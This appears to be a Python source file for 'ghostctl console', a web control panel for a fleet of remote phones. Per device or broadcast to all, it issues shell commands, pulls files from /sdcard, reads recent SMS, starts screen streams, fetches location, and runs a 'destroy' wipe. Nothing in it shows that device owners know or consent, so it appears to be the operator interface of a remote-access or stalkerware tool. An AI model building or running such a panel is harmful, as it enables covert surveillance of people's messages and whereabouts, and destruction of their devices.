#!/usr/bin/env python3
"""ghostctl web console — MeshCentral-inspired read/control UI.

Serves server-rendered HTML (stdlib http.server, no external deps, works
offline). Talks to the daemon the same way ghostctl.py does: it imports
ghostctl and uses its rpc() against the daemon admin port
(127.0.0.1:8444, env GHOSTCTL_ADMIN_HOST/PORT).

Pages:
  /                 device list (auto-refresh), online dot, last_seen,
                    battery, IP -> click through to detail
  /device/<id>      device detail: command history + action forms
                    (shell, files ls/get, sms recent, screen start/stop,
                    loc once, update, destroy) 1:1 with ghostctl.py verbs
  /cmd/<id>         result page after a POSTed command
  /broadcast        pick a command + "--all" broadcast execution
  /stream/<id>      MJPEG/streaming display (tolerates absence: the daemon
                    does not relay binary media streams yet — the page shows
                    a waiting state until /stream/<id>/feed responds)

Auth: HTTP Basic (every request). Password from env GHOST_CONSOLE_PASS;
if unset, a random one is generated and printed at startup.
User field is ignored (any name works, e.g. curl -u ghost:<pass>).

Run:  python3 console.py [--host 127.0.0.1] [--port 9443]
Binds 127.0.0.1 by default. Use --host 0.0.0.0 for remote access, but
remember to `sudo ufw allow` the port explicitly (do NOT open preemptively).

Command history is read from history.json next to this file (runtime
artifact written by daemon.py); read-only, tolerates its absence.
"""
import argparse
import base64
import hmac
import html
import json
import os
import secrets
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, quote, urlparse

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE))
import ghostctl  # noqa: E402  (reuse the CLI's daemon client code)

HISTORY_FILE = BASE / "history.json"

# Verbs the console exposes — 1:1 with ghostctl.py's supported set.
# Each: (action, label, [(argname, placeholder, default), ...], needs_args)
DEVICE_FORMS = [
    ("shell",     "shell",            [("arg", "echo hi", "")],               True),
    ("files ls",  "files ls",         [("arg", "/sdcard", "/sdcard")],        True),
    ("files get", "files get",        [("arg", "/sdcard/x.jpg", "")],         True),
    ("sms recent","sms recent",       [("arg", "20", "20")],                  True),
    ("screen start", "screen start",  [],                                     False),
    ("screen stop",  "screen stop",   [],                                     False),
    ("loc once",  "loc once",         [],                                     False),
    ("update",    "update",           [],                                     False),
    ("destroy",   "destroy",          [],                                     False),
]
# Split-verb actions map to (action, args) the way ghostctl.build_args does.
DANGEROUS = {"destroy"}
VERBS = [f[0] for f in DEVICE_FORMS]

PASSWORD = os.environ.get("GHOST_CONSOLE_PASS") or secrets.token_urlsafe(9)


def e(s):
    """html.escape for str/anything."""
    return html.escape(str(s if s is not None else ""))


def fmt_age(ts):
    if not ts:
        return "-"
    d = max(0, int(time.time() - ts))
    if d < 60:
        return f"{d}s ago"
    if d < 3600:
        return f"{d // 60}m ago"
    if d < 86400:
        return f"{d // 3600}h ago"
    return f"{d // 86400}d ago"


def load_history():
    try:
        return json.loads(HISTORY_FILE.read_text())
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return []


def parse_verb(verb):
    """Mirror ghostctl.build_args: 'files ls /sdcard' -> ('files', ['/sdcard']),
    'shell echo hi' -> ('shell', ['echo hi']) — shell takes one string."""
    parts = verb.split(None, 1)
    action = parts[0]
    rest = parts[1] if len(parts) > 1 else ""
    if action == "shell":
        return action, [rest] if rest else []
    return action, rest.split()


def rpc_command(device_id, verb, wait=15.0):
    action, args = parse_verb(verb)
    return ghostctl.rpc({"op": "command", "all": False, "device_id": device_id,
                         "action": action, "args": args, "wait": wait})


def rpc_broadcast(verb, wait=15.0):
    action, args = parse_verb(verb)
    return ghostctl.rpc({"op": "command", "all": True, "device_id": None,
                         "action": action, "args": args, "wait": wait})


def rpc_devices():
    return ghostctl.rpc({"op": "list"})


# ---------------------------------------------------------------- pages ----

PAGE = """<!doctype html><html><head><meta charset="utf-8">
<title>{title}</title><style>
body{{font-family:system-ui,sans-serif;background:#111;color:#ddd;margin:1.5rem}}
a{{color:#7fc}} table{{border-collapse:collapse;width:100%}}
th,td{{border:1px solid #333;padding:.35rem .6rem;text-align:left;font-size:.9rem}}
.dot{{display:inline-block;width:10px;height:10px;border-radius:50%}}
.on{{background:#3e6}} .off{{background:#a33}}
form{{display:inline-block;margin:.2rem 0}} input[type=text],select{{background:#222;color:#ddd;border:1px solid #444}}
button{{background:#265;border:1px solid #48a;color:#dff;padding:.25rem .7rem;cursor:pointer}}
.danger button{{background:#622;border-color:#a44;color:#fdd}}
pre{{background:#1b1b1b;border:1px solid #333;padding:.6rem;overflow-x:auto}}
.nav{{margin-bottom:1rem}} .muted{{color:#888}}
</style>{head}</head><body>
<div class="nav"><a href="/">devices</a> · <a href="/broadcast">broadcast</a></div>
{body}</body></html>"""


def render(title, body, refresh=None, extra_head=""):
    head = f'<meta http-equiv="refresh" content="{refresh}">' if refresh else ""
    head += extra_head
    return PAGE.format(title=e(title), head=head, body=body)


def page_devices():
    try:
        resp = rpc_devices()
        devices = (resp or {}).get("devices", {})
        if not isinstance(devices, dict):
            devices = {}
    except Exception as ex:  # daemon down
        body = (f"<h1>Devices</h1><p class='muted'>daemon unreachable: {e(ex)}</p>"
                "<p class='muted'>retrying… start it: <code>python3 daemon.py</code></p>")
        return render("Devices", body, refresh=5)
    rows = []
    for did in sorted(devices):
        d = devices[did] or {}
        dot = "on" if d.get("online") else "off"
        bat = d.get("battery")
        bat = f"{bat}%" if bat is not None else "-"
        rows.append(
            f"<tr><td><span class='dot {dot}'></span> {'on' if d.get('online') else 'off'}</td>"
            f"<td><a href='/device/{quote(did)}'>{e(did)}</a></td>"
            f"<td>{e(fmt_age(d.get('last_seen')))}</td><td>{e(bat)}</td>"
            f"<td>{e(d.get('ip') or '-')}</td>"
            f"<td><a href='/stream/{quote(did)}'>stream</a></td></tr>")
    body = ("<h1>Devices</h1><table><tr><th></th><th>id</th><th>last seen</th>"
            "<th>battery</th><th>ip</th><th></th></tr>"
            + ("".join(rows) or "<tr><td colspan=6 class=muted>none yet</td></tr>")
            + "</table><p class=muted>auto-refresh 5s</p>")
    return render("Devices", body, refresh=5)


def page_device(did):
    try:
        resp = rpc_devices()
        d = (resp or {}).get("devices", {}).get(did)
    except Exception:
        d = None
    if d is None:
        return 404, render("404", f"<h1>unknown device {e(did)}</h1><a href='/'>back</a>")
    bat = d.get("battery")
    forms = []
    for verb, label, fields, _needs in DEVICE_FORMS:
        inputs = "".join(
            f" <input type='text' name='{name}' placeholder=\"{e(ph)}\" "
            f"value='{e(val)}' size='30'>" for name, ph, val in fields)
        confirm = ("onclick=\"return confirm('destroy %s? this wipes the device')\""
                   % e(did)) if verb in DANGEROUS else ""
        cls = " class='danger'" if verb in DANGEROUS else ""
        forms.append(f"<form method='post' action='/device/{quote(did)}/cmd'{cls}>"
                     f"<input type='hidden' name='verb' value='{e(verb)}'>"
                     f"{inputs} <button {confirm}>{e(label)}</button></form>")
    hist = [h for h in load_history() if h.get("device_id") == did]
    hist.reverse()
    hrows = "".join(
        f"<tr><td>{e(fmt_age(h.get('ts')))}</td><td>{e(h.get('action'))} "
        f"{e(' '.join(h.get('args') or []))}</td><td>{e(h.get('status'))}</td>"
        f"<td><pre>{e(json.dumps(h.get('result'), ensure_ascii=False)[:400])}</pre></td></tr>"
        for h in hist[:50])
    body = (
        f"<h1>{e(did)}</h1>"
        f"<p>status: <span class='dot {'on' if d.get('online') else 'off'}'></span>"
        f" {'online' if d.get('online') else 'offline'} · "
        f"battery: {e(bat if bat is not None else '-')} · ip: {e(d.get('ip') or '-')} · "
        f"last seen: {e(fmt_age(d.get('last_seen')))} · "
        f"<a href='/stream/{quote(did)}'>stream</a></p>"
        "<h2>Actions</h2>" + "<br>".join(forms) +
        "<h2>Command history</h2><table><tr><th>when</th><th>command</th>"
        f"<th>status</th><th>result</th></tr>{hrows or '<tr><td colspan=4 class=muted>none</td></tr>'}</table>")
    return 200, render(f"device {did}", body)


def page_cmd_result(title, resp, back_href):
    ok = bool(resp.get("ok"))
    detail = ""
    entry = resp.get("entry")
    if entry:
        detail = (f"<p>status: {e(entry.get('status'))} · device: "
                  f"{e(entry.get('device_id'))} · cmd_id: {e(entry.get('cmd_id'))}</p>")
    body = (f"<h1>{e(title)} — {'OK' if ok else 'FAILED'}</h1>"
            f"<a href='{back_href}'>&larr; back</a> {detail}"
            f"<pre>{e(json.dumps(resp, indent=2, ensure_ascii=False))}</pre>")
    return render(title, body)


def page_broadcast():
    opts = "".join(f"<option value='{e(v)}'>{e(v)}</option>" for v in VERBS)
    body = ("<h1>Broadcast (--all)</h1>"
            "<form method='post' action='/broadcast'>"
            "<select name='verb'>" + opts + "</select> "
            "<input type='text' name='arg' placeholder='optional arg' size='30'> "
            "<button onclick=\"return confirm('broadcast to ALL online devices?')\">"
            "send to all</button></form>"
            "<p class=muted>sends the verb to every online device via the daemon's "
            "broadcast op; results shown per-device.</p>")
    return render("Broadcast", body)


def page_stream(did):
    body = (f"<h1>stream — {e(did)}</h1>"
            f"<img id='feed' src='/stream/{quote(did)}/feed' alt='stream' "
            "style='max-width:100%;background:#000;min-height:60px'>"
            "<p id='note' class=muted>waiting for stream…</p>"
            "<p class=muted>The daemon does not yet persist/relay binary media "
            "streams (cam/screen live). This page displays an MJPEG feed from "
            "<code>/stream/&lt;id&gt;/feed</code> once the daemon exposes one; "
            "until then it shows a waiting state.</p>"
            "<a href='/device/" + quote(did) + "'>&larr; device</a>"
            "<script>feed.onerror=()=>{feed.style.display='none';"
            "note.textContent='no active stream (daemon stream relay pending)';"
            "setTimeout(()=>{feed.style.display='';note.textContent='waiting…';"
            "feed.src=feed.src;},3000)};</script>")
    return render(f"stream {did}", body, extra_head="")


class Handler(BaseHTTPRequestHandler):
    server_version = "ghostctl-console/1"

    def log_message(self, fmt, *args):  # quiet-ish
        sys.stderr.write("%s - %s\n" % (self.address_string(), fmt % args))

    # ---------------------------------------------------------- helpers --
    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def _authed(self):
        hdr = self.headers.get("Authorization", "")
        if hdr.startswith("Basic "):
            try:
                _, _, pw = base64.b64decode(hdr[6:]).decode().partition(":")
            except Exception:
                pw = None
            return pw is not None and hmac.compare_digest(
                pw.encode(), PASSWORD.encode())
        return False

    def _check(self):
        if self._authed():
            return True
        body = "<h1>401 Unauthorized</h1><p>ghostctl console: bad password</p>"
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="ghostctl"')
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body.encode())))
        self.end_headers()
        self.wfile.write(body.encode())
        return False

    def _body_qs(self):
        n = int(self.headers.get("Content-Length") or 0)
        return parse_qs(self.rfile.read(n).decode() if n else "")

    # -------------------------------------------------------------- GET --
    def do_GET(self):
        if not self._check():
            return
        u = urlparse(self.path)
        p = u.path.rstrip("/") or "/"
        if p == "/":
            self._send(200, page_devices())
        elif p.startswith("/device/"):
            code, page = page_device(p.split("/", 2)[2])
            self._send(code, page)
        elif p == "/broadcast":
            self._send(200, page_broadcast())
        elif p.startswith("/stream/"):
            did = p.split("/", 2)[2]
            if did.endswith("/feed"):
                self.stream_feed(did[:-len("/feed")])
            else:
                self._send(200, page_stream(did))
        elif p == "/favicon.ico":
            self._send(204, b"", ctype="image/x-icon")
        else:
            self._send(404, render("404", "<h1>404</h1><a href='/'>devices</a>"))

    # ------------------------------------------------------------- POST --
    def do_POST(self):
        if not self._check():
            return
        u = urlparse(self.path)
        p = u.path.rstrip("/")
        qs = self._body_qs()
        verb = (qs.get("verb") or [""])[0].strip()
        arg = (qs.get("arg") or [""])[0].strip()
        if verb not in VERBS:
            self._send(400, render("bad request",
                                   f"<h1>bad verb {e(verb)}</h1><a href='/'>back</a>"))
            return
        if arg:
            verb = f"{verb} {arg}"
        if p.startswith("/device/") and p.endswith("/cmd"):
            did = p[len("/device/"):-len("/cmd")]
            try:
                resp = rpc_command(did, verb, wait=20.0)
            except Exception as ex:
                resp = {"ok": False, "error": str(ex)}
            self._send(200, page_cmd_result(f"{verb} → {did}", resp,
                                            f"/device/{quote(did)}"))
        elif p == "/broadcast":
            try:
                resp = rpc_broadcast(verb, wait=20.0)
            except Exception as ex:
                resp = {"ok": False, "error": str(ex)}
            self._send(200, page_cmd_result(f"broadcast {verb}", resp, "/broadcast"))
        else:
            self._send(404, render("404", "<h1>404</h1><a href='/'>devices</a>"))

    # ---------------------------------------------------------- stream ----
    def stream_feed(self, did):
        """MJPEG relay point. The daemon doesn't expose binary streams yet, so
        this reports 503 (browsers/our <img> just keep waiting/retrying; the
        stream page shows the waiting state). When the daemon gains a stream
        op, this handler should emit multipart/x-mixed-replace frames."""
        note = (f"no active stream for {did} (daemon stream relay not yet "
                "implemented)").encode()
        self.send_response(503)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(note)))
        self.end_headers()
        self.wfile.write(note)


def main():
    ap = argparse.ArgumentParser(description="ghostctl web console")
    ap.add_argument("--host", default="127.0.0.1",
                    help="bind host (default 127.0.0.1; use 0.0.0.0 for remote "
                         "+ explicit `sudo ufw allow` — never open preemptively)")
    ap.add_argument("--port", type=int, default=9443)
    a = ap.parse_args()
    httpd = ThreadingHTTPServer((a.host, a.port), Handler)
    gen = " (random, generated this start)" if not os.environ.get("GHOST_CONSOLE_PASS") else ""
    print(f"ghostctl console: http://{a.host}:{a.port}  (user: anything, "
          f"password{gen}: {PASSWORD})", flush=True)
    print(f"set GHOST_CONSOLE_PASS=<pw> to fix the password; daemon admin "
          f"at {ghostctl.ADMIN_HOST}:{ghostctl.ADMIN_PORT}", flush=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
